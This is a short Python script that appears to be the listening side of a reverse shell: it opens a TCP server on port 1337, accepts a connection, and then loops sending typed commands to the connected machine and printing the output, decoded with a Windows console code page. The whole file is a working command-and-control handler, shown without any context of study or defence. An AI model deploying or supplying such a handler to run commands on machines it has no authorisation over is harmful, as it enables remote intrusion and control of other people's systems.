import socket as so
Host = ""
Port = 1337

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.setsockopt(so.SOL_SOCKET, so.SO_REUSEADDR, 1)
s.bind((Host, Port))
s.listen(3)
connection, addr = s.accept()
print("Connection to " + addr[0])
data = connection.recv(5120).decode("utf-8")
print(data)
while True:
    cmd = input("Command: ")
    connection.send(bytes(cmd, "utf-8"))
    data = connection.recv(5120).decode("cp850")
    # error = connection.recv(256).decode("utf-8")
    print(data)
    # print(error)

connection.close()
